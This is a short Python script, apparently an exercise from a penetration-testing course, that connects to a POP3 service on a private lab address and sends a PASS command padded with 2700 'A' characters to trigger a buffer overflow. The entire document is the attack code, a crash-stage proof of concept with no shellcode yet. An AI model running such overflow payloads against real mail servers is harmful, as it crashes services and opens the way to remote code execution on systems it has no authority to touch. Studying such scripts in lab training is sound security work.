#!/usr/bin/env python
import socket

# Settings
HOST='10.11.12.152'
PORT=110

def exploit():

    buffer = 'A' * 2700

    try:
        print("Payload with %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((str(HOST), int(PORT)))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + "\r\n")
        s.send('QUIT\r\n')
        s.close()
    except:
        print('Could not connect to POP3!')

if __name__ == '__main__':
    exploit()
